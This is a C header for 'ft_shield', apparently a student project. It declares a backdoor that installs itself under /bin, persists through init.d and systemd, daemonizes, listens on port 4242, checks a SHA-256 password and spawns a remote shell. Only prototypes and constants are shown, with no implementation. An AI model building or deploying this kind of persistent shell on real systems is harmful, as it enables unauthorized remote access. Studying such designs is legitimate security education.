#ifndef FT_SHIELD_H
#define FT_SHIELD_H

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <netdb.h>
#include <netinet/in.h>
#include <poll.h>
#include <pwd.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef PATH_MAX
# define PATH_MAX 4096
#endif

#define PORT		4242
#define MAX_CLI		3
#define MAX_LINE	128
#define MAX_TRY		3
#define SALT_LEN	16
#define HASH_LEN	32

#define INSTALL_PATH	"/bin/ft_shield"
#define TMP_PATH	"/bin/.ft_shield.tmp"
#define INIT_PATH	"/etc/init.d/ft_shield"
#define SYSTEMD_PATH	"/etc/systemd/system/ft_shield.service"
#define LOCK_PATH	"/var/lock/ft_shield.lock"
#define PID_PATH	"/var/run/ft_shield.pid"

typedef struct s_client
{
	int	fd;
	int	tries;
	int	authed;
}	t_client;

typedef struct s_sha256
{
	uint32_t	state[8];
	uint64_t	len;
	unsigned char	buf[64];
	size_t		idx;
}	t_sha256;

extern char	**environ;
extern int	g_pending_shell;
extern const char	*g_init_script;
extern const char	*g_systemd_unit;

/* main */
int	run_daemon(void);

/* identity */
void	print_login(void);

/* install */
int	is_installed(void);
int	install_self(void);
int	install_service(void);
void	spawn_daemon(void);

/* daemonize */
int	daemonize(void);

/* lock */
int	acquire_lock(void);
void	write_pidfile(void);

/* signal */
void	setup_signals(void);

/* server */
int	run_server(void);

/* auth */
int	auth_step(t_client *c);
int	verify_password(const char *pw);

/* session */
int	session_step(t_client *c);

/* shell */
void	spawn_shell(int fd);

/* sha256 */
void	sha256_init(t_sha256 *ctx);
void	sha256_update(t_sha256 *ctx, const void *data, size_t len);
void	sha256_final(t_sha256 *ctx, unsigned char out[HASH_LEN]);

/* utils */
ssize_t	send_str(int fd, const char *s);
ssize_t	read_line(int fd, char *buf, size_t max);

#endif
